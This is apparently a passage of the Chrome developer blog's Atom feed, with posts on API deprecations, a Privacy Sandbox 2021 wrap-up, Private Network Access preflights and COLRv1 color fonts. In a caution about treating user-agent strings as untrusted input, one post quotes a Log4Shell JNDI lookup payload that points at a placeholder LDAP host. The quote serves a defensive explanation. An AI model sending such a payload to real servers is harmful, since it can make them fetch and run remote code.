There can be many reasons why we would remove an\nAPI, such as:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;They are superseded by newer APIs.&lt;/li&gt;\n&lt;li&gt;They are updated to reflect changes to specifications to bring alignment and\nconsistency with other browsers.&lt;/li&gt;\n&lt;li&gt;They are early experiments that never came to fruition in other browsers and\nthus can increase the burden of support for web developers.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Some of these changes will have an effect on a very small number of sites. To\nmitigate issues ahead of time, we try to give developers advanced notice so they\ncan make the required changes to keep their sites running.&lt;/p&gt;\n&lt;p&gt;Chrome currently has a &lt;a href=&quot;http://www.chromium.org/blink#TOC-Launch-Process:-Deprecation&quot;&gt;process for deprecations and removals of\nAPI&#39;s&lt;/a&gt;,\nessentially:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Announce on the\n&lt;a href=&quot;https://groups.google.com/a/chromium.org/forum/#!forum/blink-dev&quot;&gt;blink-dev&lt;/a&gt;\nmailing list.&lt;/li&gt;\n&lt;li&gt;Set warnings and give time scales in the Chrome DevTools Console when usage\nis detected on the page.&lt;/li&gt;\n&lt;li&gt;Wait, monitor, and then remove the feature as usage drops.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;You can find a list of all deprecated features on chromestatus.com using the\n&lt;a href=&quot;https://www.chromestatus.com/features#deprecated&quot;&gt;deprecated filter&lt;/a&gt; and\nremoved features by applying the &lt;a href=&quot;https://www.chromestatus.com/features#removed&quot;&gt;removed\nfilter&lt;/a&gt;. We will also try to\nsummarize some of the changes, reasoning, and migration paths in these posts.&lt;/p&gt;\n</content>\n  </entry>\n  \n  \n  <entry>\n    <title>Progress in the Privacy Sandbox (December 2021)</title>\n    <link href=\"https://developer.chrome.com/en/blog/progress-in-the-privacy-sandbox-2021-12/\" />\n    <updated>2022-01-07T00:00:00+00:00</updated>\n    <id>https://developer.chrome.com/en/blog/progress-in-the-privacy-sandbox-2021-12/</id>\n    \n      \n      \n      <author>\n        <name><name>Rowan Merewood</name></name>\n      </author>\n      \n    \n    <content type=\"html\">&lt;p&gt;Welcome to the 2021 wrap-up edition of &lt;strong&gt;&lt;a href=&quot;https://developer.chrome.com/tags/progress-in-the-privacy-sandbox/&quot;&gt;Progress in the Privacy\nSandbox&lt;/a&gt;&lt;/strong&gt;, tracking the milestones on\nthe path to phasing out third-party cookies in Chrome and working towards a more\nprivate web. Normally, we share an overview of updates to the &lt;strong&gt;&lt;a href=&quot;https://privacysandbox.com/timeline/&quot;&gt;Privacy Sandbox\ntimeline&lt;/a&gt;&lt;/strong&gt; along with news from across\nthe project, but December was a quiet month. Instead, we&#39;ll look back at some of\nthe activities over 2021 and provide a few potential resolutions you can make\nnow we are in the new year.&lt;/p&gt;\n&lt;h2 id=&quot;chromium-development-process&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#chromium-development-process&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Chromium development process&lt;/h2&gt;\n&lt;p&gt;For a new web platform feature to land in Chromium, it needs to go through the\n&lt;a href=&quot;https://www.chromium.org/blink/launching-features&quot;&gt;project&#39;s open development\nprocess&lt;/a&gt;. In 2021, the\nPrivacy Sandbox team produced:&lt;/p&gt;\n&lt;figure&gt;\n  &lt;table style=&quot;font-size: 140%; font-weight: bold; font-variant-numeric: tabular-nums;&quot;&gt;\n  &lt;tr&gt;&lt;td&gt;🥚&lt;/td&gt;&lt;td&gt;Intent to Prototype &lt;/td&gt;     &lt;td&gt;19&lt;/td&gt;&lt;/tr&gt;\n  &lt;tr&gt;&lt;td&gt;🧪&lt;/td&gt;&lt;td&gt;Intent to Experiment&lt;/td&gt;&lt;td&gt;&amp;nbsp;7&lt;/td&gt;&lt;/tr&gt;\n  &lt;tr&gt;&lt;td&gt;🚀&lt;/td&gt;&lt;td&gt;Intent to Ship      &lt;/td&gt;     &lt;td&gt;11&lt;/td&gt;&lt;/tr&gt;\n  &lt;/table&gt;\n  &lt;figcaption&gt;\n    &lt;a href=&quot;https://docs.google.com/spreadsheets/d/e/2PACX-1vR-5YYZ-lxG9xelJFCYM2yajUEWUNKZkiXcWX9BYi8dSUV_5Xrhd5u-iyNNf4w8NAVwrSrVWjeNrC-i/pubhtml#&quot;&gt;Source&lt;/a&gt;\n  &lt;/figcaption&gt;\n&lt;/figure&gt;\n&lt;p&gt;Each milestone is also an invitation for the wider web ecosystem to contribute.&lt;/p&gt;\n&lt;p&gt;An &lt;strong&gt;Intent to Prototype&lt;/strong&gt; is the first checkpoint, where we invite discussion\nand early experimentation. This means a proposal will be available on GitHub,\nwhere &lt;strong&gt;you can ask a question by creating an Issue&lt;/strong&gt; or &lt;strong&gt;&lt;a href=&quot;https://developer.chrome.com/docs/privacy-sandbox/cds21-update/#discussion&quot;&gt;join discussions and\npresentations in standards\ngroups&lt;/a&gt;&lt;/strong&gt; such as the W3C and\nIETF. This is also where coding begins, which means you can &lt;strong&gt;expect the\nprototype functionality to be made available for developer testing behind a\n&lt;a href=&quot;https://www.chromium.org/developers/how-tos/run-chromium-with-flags&quot;&gt;feature\nflag&lt;/a&gt;&lt;/strong&gt;.\nInitial feedback is critical for validating and iterating on proposals.&lt;/p&gt;\n&lt;p&gt;An &lt;strong&gt;Intent to Experiment&lt;/strong&gt; is an optional step if we’d like to request an\norigin trial. Developers &lt;strong&gt;can &lt;a href=&quot;https://developer.chrome.com/blog/origin-trials/&quot;&gt;sign up for the origin\ntrial&lt;/a&gt;&lt;/strong&gt; of a feature, and then &lt;strong&gt;test it in production&lt;/strong&gt;.\nIt&#39;s called an experiment because we have specific aspects of the feature we\nwant to validate in real-world environments. Developers that can &lt;strong&gt;test and\nshare the results of those tests&lt;/strong&gt; provide valuable feedback to help iterate and\nevolve the feature.&lt;/p&gt;\n&lt;p&gt;An &lt;strong&gt;Intent to Ship&lt;/strong&gt; is the final milestone which signals that a feature is now\ncomplete and ready for general availability. Once approved, the feature is\nmerged into an upcoming release and then progresses through the Canary, Beta,\nand Stable channels. It&#39;s critical to ensure you &lt;strong&gt;test your sites with the\n&lt;a href=&quot;https://www.google.com/chrome/canary/&quot;&gt;Canary&lt;/a&gt; and\n&lt;a href=&quot;https://www.google.com/chrome/beta/&quot;&gt;Beta&lt;/a&gt; versions of Chrome&lt;/strong&gt; to catch and\nreport any bugs before a feature reaches Stable.&lt;/p&gt;\n&lt;h2 id=&quot;proposals&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#proposals&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Proposals&lt;/h2&gt;\n&lt;p&gt;Each Privacy Sandbox proposal has an accompanying GitHub repository. A\nrepository hosts an explainer to summarize overall functionality, a detailed\nspecification for implementation by browsers, and contributions from across the\nweb ecosystem in the form of Issues and Pull Requests.&lt;/p&gt;\n&lt;p&gt;Across 14 Privacy Sandbox repositories, we had:&lt;/p&gt;\n&lt;figure&gt;\n  &lt;table style=&quot;font-size: 140%; font-weight: bold; font-variant-numeric: tabular-nums;&quot;&gt;\n    &lt;tr&gt;&lt;td rowspan=&quot;2&quot;&gt;💬&lt;/td&gt;&lt;td&gt;545&lt;/td&gt;&lt;td&gt;Issues created&lt;/td&gt;&lt;/tr&gt;\n    &lt;tr&gt;                       &lt;td&gt;250&lt;/td&gt;&lt;td&gt;Issues closed&lt;/td&gt;&lt;/tr&gt;\n    &lt;tr&gt;&lt;td rowspan=&quot;2&quot;&gt;🛠️&lt;/td&gt;&lt;td&gt;261&lt;/td&gt;&lt;td&gt;Pull Requests created&lt;/td&gt;&lt;/tr&gt;\n    &lt;tr&gt;                       &lt;td&gt;223&lt;/td&gt;&lt;td&gt;Pull Requests merged&lt;/td&gt;&lt;/tr&gt;\n  &lt;/table&gt;\n  &lt;figcaption&gt;\n    &lt;a href=&quot;https://docs.google.com/spreadsheets/d/e/2PACX-1vR-5YYZ-lxG9xelJFCYM2yajUEWUNKZkiXcWX9BYi8dSUV_5Xrhd5u-iyNNf4w8NAVwrSrVWjeNrC-i/pubhtml#&quot;&gt;Source&lt;/a&gt;\n  &lt;/figcaption&gt;\n&lt;/figure&gt;\n&lt;p&gt;The language in explainers and specifications is often targeted to an audience\nalready familiar with standards and browser development, which can be\nchallenging if you&#39;re unfamiliar with it. However, the aim of an explainer is to\nexplain! If there are points that are unclear or not covered, &lt;strong&gt;we want you to\nraise an Issue&lt;/strong&gt; so we can update and clarify the explainer.&lt;/p&gt;\n&lt;h2 id=&quot;resolutions&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#resolutions&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Resolutions&lt;/h2&gt;\n&lt;h3 id=&quot;user-agent-spring-cleaning&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#user-agent-spring-cleaning&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; User-agent spring cleaning&lt;/h3&gt;\n&lt;p&gt;As we were counting &lt;em&gt;down&lt;/em&gt; to the New Year, we&#39;re also counting &lt;em&gt;up&lt;/em&gt; to both\n&lt;a href=&quot;https://developer.chrome.com/blog/force-major-version-to-100/&quot;&gt;Chrome 100&lt;/a&gt; and the incremental &lt;a href=&quot;https://developer.chrome.com/docs/privacy-sandbox/user-agent/&quot;&gt;reduction\nof the user-agent string&lt;/a&gt;. This is a good\nmotivator to revisit any usage of the user-agent string in your code to check if\nit&#39;s affected by either of these changes.&lt;/p&gt;\n&lt;p&gt;To find those areas:&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;Search for &lt;code&gt;navigator.userAgent&lt;/code&gt; in your JavaScript code, or access to the\n&lt;code&gt;User-Agent&lt;/code&gt; header in your server code.&lt;/li&gt;\n&lt;li&gt;Check your parsing of the string for assumptions about a 2 digit version. For\nexample, a regex that specifies &lt;code&gt;\\d\\d&lt;/code&gt; or &lt;code&gt;\\d{2}&lt;/code&gt; should be replaced with\n&lt;code&gt;\\d+&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;Check your use of the string for anywhere you rely on the:\n&lt;ul&gt;\n&lt;li&gt;platform (operating system) version&lt;/li&gt;\n&lt;li&gt;full Chrome build version&lt;/li&gt;\n&lt;li&gt;mobile device name&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;These are the values that will be reduced to fixed strings in the future. If\nyou need access to these values, &lt;a href=&quot;https://web.dev/migrate-to-ua-ch/&quot;&gt;migrate to User-Agent Client\nHints&lt;/a&gt;.&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;There is one December update to mention—if you are adopting User-Agent Client\nHints, we have sent the &lt;strong&gt;Intent to Ship to &lt;a href=&quot;https://groups.google.com/a/chromium.org/g/blink-dev/c/JQ68cvYuiQU/m/S_33YSqxCwAJ&quot;&gt;enable delegating hints to other\norigins in\nHTML&lt;/a&gt;&lt;/strong&gt;\nvia a &lt;code&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; tag. For example:&lt;/p&gt;\n&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;accept-ch&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;sec-ch-ua-model=( https://foo.bar )&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;If you&#39;re in an enthusiastic spring cleaning mood, you can also consider\nalternatives to the use of user-agent altogether. If you&#39;re using the string to\ndetect mobile devices, then investigate if you can replace this with responsive\ndesign. If you&#39;re checking the browser name and version for feature support, see\nif you can use feature detection instead.&lt;/p&gt;\n&lt;p&gt;It&#39;s always worth remembering that the user-agent, like any client provided\nvalue, is not guaranteed to be accurate or even provided. The recent &lt;a href=&quot;https://logging.apache.org/log4j/2.x/security.html&quot;&gt;Log4j\nvulnerability, &amp;quot;Log4shell&amp;quot;&lt;/a&gt;\nprovides an example of this risk. A client that sets its user-agent string to\ninclude a value like &lt;code&gt;${jndi:ldap://example.com/file}&lt;/code&gt; may be able to get a site\nto actively parse that on the server.&lt;/p&gt;\n&lt;div class=&quot;aside aside--caution&quot;&gt;&lt;div class=&quot;aside__label gap-bottom-300&quot;&gt;&lt;svg width=&quot;24&quot; height=&quot;24&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; clip-rule=&quot;evenodd&quot; d=&quot;M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15v-2h2v2h-2zm0-10v6h2V7h-2z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;span&gt;Caution&lt;/span&gt;&lt;/div&gt;\n&lt;p&gt;It&#39;s critical that you treat user-agent in the same way as any other form of\nuser input: sanitize and validate it before acting on the value.&lt;/p&gt;\n&lt;/div&gt;\n&lt;h3 id=&quot;cookie-cataloguing&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#cookie-cataloguing&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Cookie cataloguing&lt;/h3&gt;\n&lt;p&gt;Another traditional new year activity is to make sure you&#39;re happy that you have\na healthy number of cookies with quality ingredients. As we continue moving\ntowards the phase out of third-party cookies, you should make sure you know\nwhich of your site&#39;s cookies will be affected. 2020 provided a headstart as it\nbecame necessary to &lt;a href=&quot;https://web.dev/samesite-cookies-explained/#samesitenone-must-be-secure&quot;&gt;mark all cookies for cross-site or third-party\nuse&lt;/a&gt;\nwith &lt;code&gt;SameSite=None&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;Any cookie where you have set the &lt;code&gt;SameSite&lt;/code&gt; attribute to &lt;code&gt;None&lt;/code&gt; will need an\nupdate.&lt;/p&gt;\n&lt;p&gt;There are three possible routes to consider at the moment:&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;If the cookie is only required in a 1:1 relationship with the top-level site,\nthen follow the progress of the &lt;strong&gt;&lt;a href=&quot;https://github.com/WICG/CHIPS&quot;&gt;CHIPS\nproposal&lt;/a&gt;&lt;/strong&gt;. This will mean adding the\n&lt;code&gt;Partitioned&lt;/code&gt; attribute to the cookie.&lt;/li&gt;\n&lt;li&gt;If the cookie is used in a cross-site context, but only across sites that you\nown and operate, then it may be a candidate for &lt;strong&gt;&lt;a href=&quot;https://developer.chrome.com/docs/privacy-sandbox/first-party-sets/&quot;&gt;First-Party\nSets&lt;/a&gt;&lt;/strong&gt;. This requires defining the\nsites in the set and adding the &lt;code&gt;SameParty&lt;/code&gt; attribute to the cookie.&lt;/li&gt;\n&lt;li&gt;If the cookie is used to provide some form of shared value across multiple\nsites, investigate the wider set of &lt;a href=&quot;https://developer.chrome.com/docs/privacy-sandbox/&quot;&gt;Privacy Sandbox\nproposals&lt;/a&gt; for an alternative solution that does not\nrely on cross-site tracking.&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;If you&#39;re feeling especially health-conscious, then this is also an ideal time\nto revisit all of your cookie usage, as we have a good recipe to improve your\nfirst-party cookies too.&lt;/p&gt;\n&lt;div class=&quot;youtube&quot;&gt;\n  &lt;iframe class=&quot;youtube__embed&quot; src=&quot;https://www.youtube.com/embed/1g2uQfP1Q3U&quot; title=&quot;youtube embed&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;\n&lt;/div&gt;\n&lt;h2 id=&quot;feedback&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#feedback&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Feedback&lt;/h2&gt;\n&lt;p&gt;As we continue to publish these monthly updates, and progress through the\nPrivacy Sandbox as a whole, we want to make sure that developers receive the\ninformation and support that they need.

This preflight request will\ncarry a new header, &lt;code&gt;Access-Control-Request-Private-Network: true&lt;/code&gt;, and the\nresponse to it must carry a corresponding header,\n&lt;code&gt;Access-Control-Allow-Private-Network: true&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;The aim is to protect users from &lt;a href=&quot;https://portswigger.net/web-security/csrf&quot;&gt;cross-site request forgery (CSRF) attacks&lt;/a&gt;\ntargeting routers and other devices on private networks.

This can allow you\nto test whether your website would work after the\n&lt;a href=&quot;#rollout-plan&quot;&gt;second phase of our rollout plan&lt;/a&gt;. Errors can be diagnosed in\nthe same way as warnings using the DevTools panels mentioned above.&lt;/p&gt;\n&lt;h2 id=&quot;what-to-do-if-your-website-is-affected&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#what-to-do-if-your-website-is-affected&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; What to do if your website is affected&lt;/h2&gt;\n&lt;p&gt;When this change rolls out in Chrome 98, it is not expected to break any\nwebsite. However, we strongly encourage you to update affected request paths to\nensure your website keeps running as expected.&lt;/p&gt;\n&lt;p&gt;There are two solutions available to you:&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;Handle preflight requests on the server side&lt;/li&gt;\n&lt;li&gt;Disable PNA checks with enterprise policies&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h3 id=&quot;server-side-requests&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#server-side-requests&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Handle preflight requests server-side&lt;/h3&gt;\n&lt;p&gt;Update the target server of any affected fetches to handle PNA preflight\nrequests. First, implement support for standard CORS preflight requests on\naffected routes. Then add support for the &lt;a href=&quot;#new-in-pna&quot;&gt;two new response headers&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;When your server receives a preflight request (an &lt;code&gt;OPTIONS&lt;/code&gt; request with CORS\nheaders), the server should check for the presence of an\n&lt;code&gt;Access-Control-Request-Private-Network: true&lt;/code&gt; header. If this header is\npresent on the request, the server should examine the &lt;code&gt;Origin&lt;/code&gt; header and the\nrequest path along with any other relevant information (such as\n&lt;code&gt;Access-Control-Request-Headers&lt;/code&gt;) to ensure the request is safe to allow.\nTypically, you should allow access to a single origin under your control.&lt;/p&gt;\n&lt;div class=&quot;aside aside--warning&quot;&gt;&lt;div class=&quot;aside__label gap-bottom-300&quot;&gt;&lt;svg width=&quot;24&quot; height=&quot;24&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; clip-rule=&quot;evenodd&quot; d=&quot;M23 21L12 2 1 21h22zm-12-3v-2h2v2h-2zm0-4h2v-4h-2v4z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;span&gt;Warning&lt;/span&gt;&lt;/div&gt;\n&lt;p&gt;Beware of insecure (non-https) origins, as they are unauthenticated. An on-path\nattacker could masquerade as any such origin!&lt;/p&gt;\n&lt;/div&gt;\n&lt;p&gt;Once your server has decided to allow the request, it should respond\n&lt;code&gt;204 No Content&lt;/code&gt; (or &lt;code&gt;200 OK&lt;/code&gt;) with the necessary CORS headers and the new PNA\nheader. These headers include &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt; and\n&lt;code&gt;Access-Control-Allow-Private-Network: true&lt;/code&gt;, as well as others as needed.&lt;/p&gt;\n&lt;p&gt;Refer to the &lt;a href=&quot;#examples&quot;&gt;examples&lt;/a&gt; for concrete scenarios.&lt;/p&gt;\n&lt;h3 id=&quot;disable-with-enterprise-policy&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#disable-with-enterprise-policy&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Disable Private Network Access checks using enterprise policies&lt;/h3&gt;\n&lt;p&gt;If you have administrative control over your users, you can disable Private\nNetwork Access checks using either of the following policies:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;https://chromeenterprise.google/policies/#InsecurePrivateNetworkRequestsAllowed&quot;&gt;&lt;code&gt;InsecurePrivateNetworkRequestsAllowed&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://chromeenterprise.google/policies/#InsecurePrivateNetworkRequestsAllowedForUrls&quot;&gt;&lt;code&gt;InsecurePrivateNetworkRequestsAllowedForUrls&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;For more information, refer to &lt;a href=&quot;https://support.google.com/chrome/a/answer/9037717&quot;&gt;Understand Chrome policy\nmanagement&lt;/a&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;whats-next&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#whats-next&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; What&#39;s next&lt;/h2&gt;\n&lt;p&gt;Next up, Chrome will extend Private Network Access checks to cover\n&lt;a href=&quot;https://developer.mozilla.org/docs/Web/API/Web_Workers_API&quot;&gt;web workers&lt;/a&gt;:\ndedicated workers, shared workers and service workers. We&#39;re tentatively aiming\nfor Chrome 100 to begin showing warnings.&lt;/p&gt;\n&lt;p&gt;Then, Chrome will extend Private Network Access checks to cover navigations,\nincluding iframes and popups. We&#39;re tentatively aiming for Chrome 102 to start\nshowing warnings.&lt;/p&gt;\n&lt;p&gt;In both cases, we will be proceeding cautiously with a similar phased rollout,\nin order to give web developers time to adjust and estimate compatibility risk.&lt;/p&gt;\n&lt;h2 id=&quot;acknowledgements&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#acknowledgements&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Acknowledgements&lt;/h2&gt;\n&lt;p&gt;Cover photo by &lt;a href=&quot;https://unsplash.com/@markolsen&quot;&gt;Mark Olsen&lt;/a&gt; on\n&lt;a href=&quot;https://unsplash.com/photos/K5j1KgecVC8&quot;&gt;Unsplash&lt;/a&gt;.&lt;/p&gt;\n</content>\n  </entry>\n  \n  \n  <entry>\n    <title>COLRv1 Color Gradient Vector Fonts in Chrome 98</title>\n    <link href=\"https://developer.chrome.com/en/blog/colrv1-fonts/\" />\n    <updated>2022-01-06T00:00:00+00:00</updated>\n    <id>https://developer.chrome.com/en/blog/colrv1-fonts/</id>\n    \n      \n      \n      <author>\n        <name><name>Dominik Röttsches</name></name>\n      </author>\n      \n      \n      <author>\n        <name><name>Rod Sheeter</name></name>\n      </author>\n      \n    \n    <content type=\"html\">&lt;p&gt;&lt;em&gt;Compact, compression-friendly, color vector fonts with all your favorite\ngradient flavors.&lt;/em&gt;&lt;/p&gt;\n&lt;p&gt;In Chrome 98, the Chrome and Fonts teams have added support for COLRv1, an\nevolution of the COLRv0 font format intended to make color fonts widespread by\nadding gradients, compositing and blending, and improved internal shape reuse\nfor crisp and compact font files that compress well.&lt;/p&gt;\n&lt;div class=&quot;aside aside--note&quot;&gt;\n&lt;p&gt;Examples in this blog post require a browser that supports\nCOLRv1 fonts.

The font does\nnot define any particular color, it just indicates where pixels should be\nplaced. That&#39;s usually a good thing. CSS lets the author flexibly choose a\ncolor. However, sometimes a glyph contains multiple colors that together have\nmeaning. For example, this flag &lt;img alt=&quot;Transgender flag consisting of pale blue and pale pink stripes.&quot; decoding=&quot;async&quot; height=&quot;16&quot; loading=&quot;lazy&quot; sizes=&quot;(min-width: 16px) 16px, calc(100vw - 48px)&quot; src=&quot;https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/8hQhmhh6F8Ff7kquy4mB.png?auto=format&quot; srcset=&quot;https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/8hQhmhh6F8Ff7kquy4mB.png?auto=format&amp;w=16 16w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/8hQhmhh6F8Ff7kquy4mB.png?auto=format&amp;w=18 18w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/8hQhmhh6F8Ff7kquy4mB.png?auto=format&amp;w=21 21w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/8hQhmhh6F8Ff7kquy4mB.png?auto=format&amp;w=24 24w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/8hQhmhh6F8Ff7kquy4mB.png?auto=format&amp;w=27 27w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/8hQhmhh6F8Ff7kquy4mB.png?auto=format&amp;w=31 31w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/8hQhmhh6F8Ff7kquy4mB.png?auto=format&amp;w=32 32w&quot; width=&quot;16&quot;&gt; with light blue, pink, and white stripes would not\nconvey the same meaning if it was simply drawn in the current text color.&lt;/p&gt;\n&lt;p&gt;Today, for most users, emojis are the only color fonts they see. Emojis\ntypically appear on the web via the system emoji font, or by inserting images\n(which has its own complications, &lt;img alt=&quot;Panda emoji with sad facial expression.&quot; decoding=&quot;async&quot; height=&quot;16&quot; loading=&quot;lazy&quot; sizes=&quot;(min-width: 16px) 16px, calc(100vw - 48px)&quot; src=&quot;https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/uFlyeIll20cgXsyl7npT.png?auto=format&quot; srcset=&quot;https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/uFlyeIll20cgXsyl7npT.png?auto=format&amp;w=16 16w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/uFlyeIll20cgXsyl7npT.png?auto=format&amp;w=18 18w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/uFlyeIll20cgXsyl7npT.png?auto=format&amp;w=21 21w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/uFlyeIll20cgXsyl7npT.png?auto=format&amp;w=24 24w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/uFlyeIll20cgXsyl7npT.png?auto=format&amp;w=27 27w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/uFlyeIll20cgXsyl7npT.png?auto=format&amp;w=31 31w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/uFlyeIll20cgXsyl7npT.png?auto=format&amp;w=32 32w&quot; width=&quot;16&quot;&gt;).

(To learn more\nabout the tradeoffs,\n&lt;a href=&quot;https://www.youtube.com/watch?v=BmqYm5Wwz8M&quot;&gt;take a look at Dominik&#39;s BlinkOn 15 conference talk&lt;/a&gt;.)\nChrome 98 brings support for COLRv1, an evolution of COLRv0. We hope that\nCOLRv1&#39;s combination of graphic capabilities and compact files will make it a\ngood choice for many color font use cases. COLRv1 adds gradients,\n&lt;a href=&quot;https://www.w3.org/TR/compositing-1/&quot;&gt;compositing, and blending&lt;/a&gt;, and improves\ninternal shape reuse to make even more compact files.&lt;/p&gt;\n&lt;p&gt;COLRv1 has expressive capability roughly equivalent to\n&lt;a href=&quot;https://svgwg.org/specs/svg-native/&quot;&gt;SVG Native&lt;/a&gt; plus\n&lt;a href=&quot;https://www.w3.org/TR/compositing-1/&quot;&gt;blending and compositing&lt;/a&gt; added on\ntop. There are four types of color fills: solid colors, linear gradients, radial\ngradients, and sweep/conic gradients. COLRv1 lets you reposition and transform\nglyph elements using a full set of translate, rotate, sheer, and scale\ntransformations. Plus, it features support for font variations and reuses\nexisting shape definition formats in the font.&lt;/p&gt;\n&lt;figure&gt; &lt;img alt=&quot;Blue     and purple crystal ball emoji with reused stars on a brown base.&quot; decoding=&quot;async&quot; height=&quot;360&quot; loading=&quot;lazy&quot; sizes=&quot;(min-width: 360px) 360px, calc(100vw - 48px)&quot; src=&quot;https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&quot; srcset=&quot;https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&amp;w=200 200w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&amp;w=228 228w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&amp;w=260 260w, 